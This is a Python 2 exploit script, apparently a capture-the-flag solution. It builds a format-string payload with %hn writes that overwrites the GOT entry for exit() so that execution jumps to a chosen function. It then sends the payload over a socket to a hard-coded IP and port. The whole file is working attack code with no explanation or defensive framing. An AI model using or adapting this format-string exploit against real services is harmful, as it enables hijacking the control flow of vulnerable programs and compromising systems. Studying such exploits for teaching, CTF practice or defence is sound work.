#!/bin/env python
#encoding:utf-8
from struct import pack
from socket import *
import time
import sys

def formatMaker(overwrite_ip , offset , shellcodeAddr):
	"""
	overwrite_ip 	:  address to overwrite, such as "exit" address in .got section 
	offset 			:	offset  from  high mem  which contains foramt string  to  low mem which save the printf's first argv 
	shellcodeAddr 	: maybe a shellcode address in mem
	"""
	shellcodeAddr_h = (shellcodeAddr  >>  16 )
	shellcodeAddr_l = (shellcodeAddr  &  0x0000FFFF )
	#print shellcodeAddr_l
	overwrite_ip_h = pack("<I",overwrite_ip+2)
	overwrite_ip_l = pack("<I",overwrite_ip)
	if shellcodeAddr_l > shellcodeAddr_h:
		format = overwrite_ip_h + overwrite_ip_l +\
				'%' + str(shellcodeAddr_h - 4 -4  ) +'c' + '%' + str(offset) + '$hn' +\
				'%' + str(shellcodeAddr_l-shellcodeAddr_h) +'c' + '%' + str(offset+1) + '$hn' 
	else:
		format = overwrite_ip_h + overwrite_ip_l + \
		'%' + str(shellcodeAddr_l - 4 -4  ) +'c' + '%' + str(offset+1) + '$hn' + \
		'%' + str(shellcodeAddr_h-shellcodeAddr_l) +'c' + '%' + str(offset) + '$hn' 
	return format




if "__main__" == __name__:

	exit_got = 0x804a044				# "exit()" address in got
	target_eip = 0x0804888c				# func "yoyo()" in printf
	offset = 80/4 - 1 
	format =  formatMaker(exit_got , 80/4 - 1  , target_eip)

	name = "random\n"
	date = "2014-03-01\n"
	ip = "202.120.7.4"
	port = 34782
	ServerAddr = {'host':ip,'port':port}
	ClientSock = socket(AF_INET , SOCK_STREAM)
	ClientSock.connect(tuple(ServerAddr.values()))
	ClientSock.send(name)
	ClientSock.send(format+"\n")
	ClientSock.send(date)
	while(1):
		result = ClientSock.recv(512)
		if not result:
			break
		print result
	ClientSock.close()